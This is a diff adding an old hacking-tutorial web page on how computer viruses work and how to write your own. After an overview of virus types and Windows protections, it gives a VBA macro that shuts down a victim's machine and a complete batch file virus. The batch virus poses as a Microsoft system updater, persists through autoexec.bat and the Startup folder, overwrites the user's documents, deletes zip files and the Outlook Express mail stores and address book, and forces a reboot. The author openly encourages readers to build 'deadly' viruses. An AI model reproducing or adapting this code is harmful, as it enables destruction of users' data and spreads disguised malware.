@@ -1,0 +1,461 @@
+<html>
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
+<title>Virus Working</title>
+<base target="_top">
+</head>
+
+<body link="#0000FF" vlink="#0000FF" alink="#0000FF">
+<!--webbot bot="HTMLMarkup" startspan TAG="XBOT" --><IFRAME SRC="../header.html" NAME="head"  WIDTH="100%" HEIGHT="175" MARGINWIDTH="0" MARGINHEIGHT="0" FRAMEBORDER="0" noresize SCROLLING=NO><!--webbot bot="HTMLMarkup" endspan
+-->
+<!--webbot bot="HTMLMarkup" startspan TAG="XBOT" --></IFRAME><!--webbot bot="HTMLMarkup"
+endspan -->
+<p><font size="3" color="#000000" face="Bookman Old Style"><b>Virus Working</b></font></p>
+
+<p>How does a Virus Work <br>
+<br>
+Well This Journal is aimed at making it clear as to how a Virus Infects something and how
+exactly it works. <br>
+I will also be giving an introduction to making your own Virus.<br>
+<br>
+Virus: What exactly is a Virus<br>
+<br>
+A virus is basically an executable file which is designed such that first of all it should
+be able to infect <br>
+documents, then it has to have the ability to survive by replicating itself and then it
+should also be able to <br>
+avoid detection. Usually to avoid detection, a Virus disguises itself as a legitimate
+program which the user <br>
+would not normally suspect to be a Virus. Viruses are designed to corrupt or delete data
+on the hard disk <br>
+i.e. on the FAT (File Allocation Table)Viruses can be classified into mainly the following
+categories:<br>
+<br>
+Boot Sector Viruses (MBR or Master Boot Record)<br>
+<br>
+Boot sector viruses can be created without much difficulty and infect either the Master
+boot record of the <br>
+hard disk or the floppy drive.The boot record program responsible for the booting of the
+operating system <br>
+is replaced by the Virus. The Virus either copies the Master Boot Program to another part
+of the Hard Disk <br>
+or overwrites it.They infect the computer when the computer boots up or the computer
+accesses the infected <br>
+floppy disk in the floppy drive.<br>
+Popular Boot Viruses would be Michelangelo, Stone etc<br>
+*********************<br>
+NewBie Tip: Don't know what a MBR or a Master Boot Record is? Now first of all understand
+what a boot <br>
+record is. Basically the boot record is the first sector of a floppy or the Hard Disk
+which contains a boot <br>
+record which contains info like disk architecture, sector and cluster size etc. <br>
+The Boot Record of the Hard Disk also has a program known as Boot Loader which loads the
+OS upon <br>
+booting.<br>
+Now The MBR is the first sector of the Hard Disk which contains the boot record and also
+additional <br>
+details like Partiton Table etc.If the MBR is corupted then the OS will not be launched.<br>
+*******************<br>
+File or Program Viruses<br>
+<br>
+Some programs are viruses in disguise, when executed they load the virus in the memory
+alongwith the <br>
+program and perform the predefined steps and infect the system.They infect program files
+like files with <br>
+extensions like .EXE, .COM , .BIN , .DRV and .SYS. Some file viruses just replicate while
+others destroy <br>
+the program being used at that time. Such viruses start replicated as soon as they are
+loaded into the <br>
+memory. As the file viruses also destroy the program currently being used, after removing
+the virus or <br>
+disinfecting the system, the program that got corrupted due to the file virus, too, has to
+be repaired or <br>
+reinstalled.<br>
+Some Popular File Viruses would be Sunday, Cascade<br>
+<br>
+Multipartite Viruses<br>
+<br>
+Multipartitite viruses are the hybrid variety, they can be best described as a cross
+between both Boot <br>
+Viruses and File viruses.They not only infect files but also infect the boot sector. They
+are more destructive <br>
+and more difficult to remove. First of all, they infect program files and when the
+infected program is <br>
+launched or run, the Multipartite viruses start infecting the boot sector too.<br>
+Now the interesting thing about these viruses is the fact that they do not stop, once the
+boot sector is <br>
+infected.Now after the boot sector is infected, when the system is booted, they load into
+the memory and <br>
+start infecting other program files.<br>
+Some popular examples would be Invader and Flip etc.<br>
+<br>
+Stealth Viruses<br>
+<br>
+They viruses are stealth in nature and use various methods to hide themselves and to avoid
+detection. They <br>
+sometimes remove themselves from the memory temporarily to avoid detection and hiding from
+virus <br>
+scanners.Some can also redirect the disk head to read another sector instead of the sector
+in which they <br>
+reside.Some stealth viruses like the Whale conceal the increase in the length of the
+infected file and display <br>
+the original length by reducing the size by the same amount as that of the increase, so as
+to avoid detection <br>
+from scanners.For example, the whale virus adds 9216 bytes to an infected file and then
+the virus substracts <br>
+the same number of bytes i.e. 9216 from the size given in the directory.<br>
+They are somwhat difficult to detect.<br>
+Polymorphic Viruses<br>
+They are the most difficult viruses to detect. They have the ability to mutate this means
+that they change the <br>
+viral code known as the signature each time it spreads or infects.Thus Antiviruses which
+look for specific <br>
+virus codes are not able to detect such viruses.<br>
+Now what exactly is a Viral Signature? Basically the Signature can be defined as the
+specific fingerprint of <br>
+a particular virus which is a string of bytes taken from the code of the virus.AntiViral
+softwares maintain a <br>
+database of known virus signatures and look for a match each time they scan for viruses.As
+we see a new <br>
+virus almost everyday, this database of Virus Signatures has to be kept updated. This is
+the reason why the <br>
+AntiVirus vendors provide updates.<br>
+Macro Viruses<br>
+<br>
+Firstly to understand Macro Viruses you need to understand a Macro. All of you may have
+definitely used <br>
+Microsoft Excel or Word,well in Office97 there is a feature known as Macros which allow a
+particular task <br>
+which is performed by a user quite often to be repeated again and again by just clicking a
+play button.They <br>
+are set of automated instructions or tasks which make work more efficient and fast for the
+users.Now <br>
+beneath Office97 there is a Visual Basic Engine,thus we can say that the core of
+Microsoft&#146;s Office suite is <br>
+a Visual Basic Engine which runs behind the scenes and can be used for advanced Visual
+Basic coding.<br>
+So macro virus would be a virus which consists of evil or viral macro VBA (Visual Basic
+Applications.) <br>
+code which can create havoc in the computer it is executed.These viruses spread quickly
+and some have <br>
+random activation, as in it's code can be included many of VB's event handlers.Macro
+viruses are not <br>
+platform specific, i.e. a Macro Virus can infect both Windows systems and also Mac
+systems.But for a <br>
+Macto virus to infect a system, the Document with the embedded evil macro has to be
+opened.<br>
+Now that I have given you a general introduction to the different types of Viruses, lets
+move on to their <br>
+working, how they exactly infect the systems.Firstly, above we discussed that Stealth
+viruses and <br>
+Polymorphic viruses are dificult to detect&#133;the question arises why?Let's take the
+exaple of what most Anti <br>
+Virus softwares do to detect and catch a Virus. Now most Anti Viruses use a technique
+knoen as <br>
+CheckSumming. Firstly understand that an executable file cannot change (like a data file.)
+unless you <br>
+upgrade the program.So the checksummer in the Anti Virus software observes all executable
+files and <br>
+records their sizes. So while scanning it compares the executable file size with the
+checksum.So as Steath <br>
+viruses reduce the the size by he sam amount as was the increase, AntiViruses which use
+only <br>
+checksumming methods are not able to detect them. So nowdays antiviruses use a method
+known as <br>
+Heuristics.Before I get on to what Heuristic scanning really is&#133; PolyMorphic Viruses
+have the ability to <br>
+mutate and can change their known Viral signature and hide from signature based anti
+viruses which <br>
+compare the signatures of executable files to the database of Viral signatures known till
+now and thus <br>
+cannot detect new viruses.Thus polymorphic Viruses cannot be detected by Signature based
+anti viruses <br>
+and Steath Viruses cannot be detected by Checksumming. <br>
+In comes in the Heuristic Scanner which do not scan for viruses using signature based
+techniques but uses a <br>
+smarter way to scan for viruses.It scand the drive for Typical viral codes and behaviour.
+But such viruses <br>
+have a downside too, sometimes they give false alarms and declare an uninfected file to be
+a virus.<br>
+How does a PolyMorphic Virus Strike?<br>
+1. The User copies an infected file to the disk. <br>
+2. When the infected file is run, it loads the Virus into the memory or the RAM. <br>
+3. The new virus looks for a host and starts infecting other files on the disk. <br>
+4. The virus makes copies of itself on the disk. <br>
+5. The mutation engines on the new viruses generates a new unique encryptic code which is <br>
+developed due to a new unique algorithm.<br>
+Thus it avoids detecting from Checksummers.<br>
+How does a Boot Virus Strike?<br>
+1. The user copies the infected file to the Hard disk or a floppy disk. <br>
+2. When the infected file is executed, the virus is loaded into the memory. <br>
+3. The virus copies the boot record program to another sector and puts a pointer to it on
+the boot <br>
+sector. <br>
+4. The virus then makes a copy of itself in the disk boot sector. <br>
+5. The next time the computer boots from the disk the Virus loads itself into the RAM or
+memory <br>
+and starts infecting other files.<br>
+How does a Macro Virus strike?<br>
+1. The user gets an infected Office Doument by email or by any other medium. <br>
+2. The infected document is opened by the user. <br>
+3. The evil Macro code looks for the event to occur which is set as the event handler at
+which the <br>
+Virus is set off or starts infeting other files.<br>
+<br>
+Windows does not include an anti-virus program. However, it includes several features that
+make it <br>
+difficult for viruses to infect your computer.(This section also gives valuable info on
+how a Virus works <br>
+and can be used to figure out how to write a virus.) It does this by using the following
+features:<br>
+<br>
+Blocking Direct Disk Access<br>
+<br>
+To infect the system or in other words, to infect the hard disk, some viruses and
+malicious programs try to <br>
+get past the operating system and system ROM BIOS using the INT25h and INT26h ports to
+write to the <br>
+hard disk directly. Whenever Windows detects a program trying to write directly to the
+hard disk, it stops <br>
+the program from doing so and displays an error message saying:<br>
+<br>
+'Windows has disabled direct disk access to protect your long filenames. To override this
+protection, see <br>
+the LOCK /? command for more information. The system has been halted. Press
+CTRL+ALT+DELETE to <br>
+restart your computer.<br>
+<br>
+This feature prevents such Viruses and malicious programs from directly writing to the
+hard disk and thus <br>
+to a certain extend helps to prevent infections.<br>
+<br>
+Recognising Master Boot Record (MBR) Modifications<br>
+<br>
+The deadlier viruses which infect the boot sector try to modify or write to the Master
+Boot Record though <br>
+the INT 13h chain. Now what Windows does is that it maintains a list of programs that are
+using the<br>
+INT 13h chain(are hooked up to this chain.). Now each time you boot up Windows, it checks
+to see which <br>
+programs are using the INT 13h chain and then compares this list of programs to the list
+it recorded earlier.<br>
+If Windows finds new programs which were not using the chain the last time Windows
+recorded the <br>
+programs hooked up to this chain, it displays an error message:<br>
+<br>
+WARNING: Your computer may have a virus. The Master Boot Record on your computer has been <br>
+modified. Would you like to see more information?'<br>
+<br>
+If you click Yes, then the Performance tab which is found under the System Properties is
+displayed. This <br>
+helps you in trouble shooting purposes. Normally when a virus has infected your system,
+then this <br>
+Performance Tab shows a report saying that a file named Mbrintl3.sys is causing drives to
+be accessed in <br>
+MS-DOS Compatibility mode.<br>
+<br>
+ldentifing Unknown Device Drivers<br>
+<br>
+Windows always maintains a list of all the real-mode device drivers that can be safely
+replaced with its <br>
+own protected-mode drivers. Now say you add a new device driver which uses the INT13h or
+INT21h <br>
+chains. Then Windows checks to see if it is in the list of drivers that can be safely
+replaced. If not then <br>
+Windows is programmed such that it would be able to access drives using only MS-DOS
+Compatibility <br>
+mode and not the normal protected mode.<br>
+<br>
+In such a scenario, Windows displays the following error message:<br>
+<br>
+'A new MSDOS resident program named &lt;filename&gt; may decrease your system performance.
+Would you <br>
+like to see more information about this problem?' <br>
+<br>
+NOTE: Here &lt;filename&gt; is the name of the new device driver.<br>
+<br>
+As a result of this feature Windows is able to detect Viruses that use Device Drivers and
+not the various <br>
+chains to propagate themselves.<br>
+<br>
+<br>
+Macro Viruses<br>
+<br>
+Macro viruses are just basically VB code written in the Visual Basic Editor that ships
+with Office 97 or <br>
+Office 2K.<br>
+*************<br>
+NewBie Tip: To launch the Visual Basic Editor simply press ALT + F11.<br>
+************<br>
+So in order to write macro viruses you just need to know VB.I am just touching some VB and
+this guide <br>
+will in no way make you a VB geek. I am writing a manual on writing Macro viruses as I
+believe that <br>
+Macro Viruses are lame and I personally hate VB and think that assembly viruses are much
+better and <br>
+deadlier.If you really want to be good at VB then you should know the entire MSDN library
+like the back <br>
+of your hand.Access the ultimate source of VB at http://msdn.microsoft.com <br>
+Macro viruses can have random or multiple activation events. Lets take an example to make
+it more clear:<br>
+<br>
+Private Sub UserForm_Initialize()<br>
+CommandButton1.Accelerator = &quot;C&quot; 'Set Accelerator key to ALT + C<br>
+End Sub<br>
+Private Sub CommandButton1_Click () <br>
+Dim intshell<br>
+intshell =<br>
+shell (c:\windows\Rundll.exe, user , ExitWindowsExec&quot;)<br>
+End Sub<br>
+<br>
+The above snippet of code is supposed to trigger off when the user clicks the command
+button. So as soon <br>
+as the user clicks the mouse button the function will be activated and a variable by the
+name intshell is <br>
+initialised and the victim's computer will shut down without warning.<br>
+<br>
+In the line Private Sub CommandButton1_Click () the CommandButton1 is the object and the
+_Click is the <br>
+event. The event can also also be changed to something else like DblClick, Keypress,
+KeyDown,Exit, Enter <br>
+etc etc. so that the macro or the virus is triggered off when the user double clicks,
+presses a key, the key is <br>
+up again, when a form is exited or when the form is started<br>
+<br>
+So if you really want to write a Macro Virus, first you need to learn VB. A good place to
+start first would <br>
+be the Online MSDN Library or get yourself a good book.If you already know a bit of the
+language 'Basic' <br>
+and have done either Javascript or Java i.e know what you mean by event handlers then I am
+sure you can <br>
+learn VBA by just reading the Help and reading the artices at MSDN.<br>
+<br>
+I personally do not like VB and think if you are still to start to learn VB then you
+should better learn some <br>
+other language and I do not think that learning VB is worth the trouble to just making a
+Virus. If your sole <br>
+aim is to make a deadly virus and create havoc then do not even consider making a Macro
+Virus i.e. <br>
+learning VB.You should rather look at learning Assembly.<br>
+<br>
+There are various reasons behind the fact that Macro viruses are not as deadly as Viruses
+made in <br>
+Assembly. You may have heard about evil Java applets which when downloaded can create
+havoc on your <br>
+pc and you may certainly have heard about the Melissa virus(Read my tutorial on Melissa
+for Source Code <br>
+and more info.), well both of them are slow viruses. By that I mean they give time to a
+user to react and <br>
+maybe stop infection and they are not efficient. While on the other hand Assembly Viruses
+do not give the <br>
+vivtim time to even realise what is happening and before he even knows it, he is
+infected!!!<br>
+<br>
+MAKING YOUR OWN DEADLY BATCH FILE VIRUS: The Atiman_8 Batch File Virus<br>
+<br>
+DISCLAIMER: This Virus&nbsp; is meant for educational purposes only. This Virus was coded
+to make people understand the basic concept of the Working of a Virus. Execute this Batch
+File at your own Risk. Any Damage caused by this file is not ours fault. <br>
+The following is a simple but somewhat deadly (but quite lame)Batch File Virus <br>
+<br>
+@ECHO OFF <br>
+CLS<br>
+IF EXIST c:\winupdt.bat GOTO CODE<br>
+GOTO SETUP<br>
+:SETUP<br>
+@ECHO OFF<br>
+ECHO Welcome To Microsoft Windows System Updater Setup<br>
+ECHO.<br>
+copy %0 c:\winupdt.bat &gt;&gt; NUL<br>
+ECHO Scanning System.....Please Wait<br>
+prompt $P$SWindows2000<br>
+type %0 &gt;&gt; c:\autoexec.bat<br>
+type %0 &gt;&gt; c:\windows\dosstart.bat<br>
+ECHO DONE.<br>
+ECHO.<br>
+ECHO Installing Components....Please Wait<br>
+FOR %%a IN (*.zip) DO del %%a<br>
+FOR %%a IN (C:\mydocu~1\*.txt) DO COPY c:\winupdt.bat %%a &gt;&gt; NUL<br>
+FOR %%a IN (C:\mydocu~1\*.xls) DO COPY c:\winupdt.bat %%a &gt;&gt; NUL<br>
+FOR %%a IN (C:\mydocu~1\*.doc) DO COPY c:\winupdt.bat %%a &gt;&gt; NUL<br>
+ECHO DONE.<br>
+ECHO.<br>
+ECHO You Now Need to Register with Microsoft's Partner: Fortune Galaxy to receive
+automatic updates.<br>
+PAUSE<br>
+ECHO Downloading Components...Please Wait<br>
+START &quot;C:\Program Files\Internet Explorer\Iexplore.exe&quot;
+http://www.crosswinds.net/~hackingtruths<br>
+IF EXIST &quot;C:\Program Files\Outlook Express\msimn.exe&quot; del
+&quot;C:\WINDOWS\Application <br>
+Data\Identities\{161C80E0-1B99-11D4-9077-FD90FD02053A}\Microsoft\Outlook
+Express\*.dbx&quot;<br>
+IF EXIST &quot;C:\WINDOWS\Application Data\Microsoft\Address Book\net.wab&quot; del <br>
+&quot;C:\WINDOWS\Application Data\Microsoft\Address Book\net.wab&quot;<br>
+ECHO Setup Will Now restart Your Computer....Please Wait<br>
+ECHO Your System is not faster by almost 40%.<br>
+ECHO Thank you for using a Microsoft Partner's product.<br>
+copy %0 &quot;C:\WINDOWS\Start Menu\Programs\StartUp\winupdt.bat&quot; &gt;&gt; NUL<br>
+c:\WINDOWS\RUNDLL user.exe,exitwindowsexec<br>
+CLS<br>
+GOTO END<br>
+:CODE<br>
+CLS <br>
+@ECHO OFF<br>
+prompt $P$SWindows2000<br>
+IF &quot;%0&quot; == &quot;C:\AUTOEXEC.BAT&quot; GOTO ABC<br>
+type %0 &gt;&gt; c:\autoexec.bat<br>
+:ABC<br>
+type %0 &gt;&gt; c:\windows\dosstart.bat<br>
+FOR %%a IN (*.zip) DO del %%a<br>
+FOR %%a IN (C:\mydocu~1\*.txt) DO COPY c:\winupdt.bat %%a &gt;&gt; NUL<br>
+FOR %%a IN (C:\mydocu~1\*.xls) DO COPY c:\winupdt.bat %%a &gt;&gt; NUL<br>
+FOR %%a IN (C:\mydocu~1\*.doc) DO COPY c:\winupdt.bat %%a &gt;&gt; NUL<br>
+START &quot;C:\Program Files\Internet Explorer\Iexplore.exe&quot;
+http://www.crosswinds.net/~hackingtruths<br>
+IF EXIST &quot;C:\Program Files\Outlook Express\msimn.exe&quot; del
+&quot;C:\WINDOWS\Application <br>
+Data\Identities\{161C80E0-1B99-11D4-9077-FD90FD02053A}\Microsoft\Outlook
+Express\*.dbx&quot; &gt;&gt; <br>
+NUL<br>
+IF EXIST &quot;C:\WINDOWS\Application Data\Microsoft\Address Book\net.wab&quot; del <br>
+&quot;C:\WINDOWS\Application Data\Microsoft\Address Book\net.wab&quot; &gt;&gt; NUL<br>
+copy %0 &quot;C:\WINDOWS\Start Menu\Programs\StartUp\winupdt.bat&quot; &gt;&gt; NUL<br>
+GOTO :END<br>
+CLS<br>
+:END<br>
+CLS<br>
+This was an example of a pretty lame batch file virus. We can similarly create a virus
+which will edit the <br>
+registry and create havoc. This is just a thought, I am not responsible for what you do
+with this.<br>
+<br>
+<br>
+Using Assembly to Create Your own Virus!!!!<br>
+<br>
+I recently got many emails asking me how they could create viruses and what all languages
+they need to <br>
+know before they can create an excellent dreaded virus. Well the simple answer to all
+these questions is <br>
+Learn Assembly. It allows us to make real deadly viruses which do not give the victim time
+to react and <br>
+infects his system even before he knows what is happening.<br>
+The best way to learn Assembly would be to read the &quot;Art Of Assembly.&quot; It is an
+excellent book which <br>
+assumes that you have quite little programming experience. It is easy to understand and
+quite impressive.<br>
+Read the Art of Assembly online and become a ASM wiz at:<br>
+<br>
+The Art of Assembly Language Programming<br>
+<br>
+http://webster.cs.ucr.edu/Page_asm/ArtofAssembly/ArtofAsm.html<br>
+Online resource:<br>
+http://www.programmersheaven.com/zone5/index.htm<br>
+You should also get a book solely about </p>
+</body>
+</html>
+<!--webbot bot="HTMLMarkup" startspan TAG="XBOT" --><IFRAME SRC="../footer.html" NAME="bol" WIDTH="100%" HEIGHT="97" MARGINWIDTH="0" MARGINHEIGHT="0" FRAMEBORDER="0" noresize SCROLLING=NO><!--webbot bot="HTMLMarkup" endspan
+-->
+<!--webbot bot="HTMLMarkup" startspan TAG="XBOT" --></IFRAME><!--webbot bot="HTMLMarkup"
+endspan -->
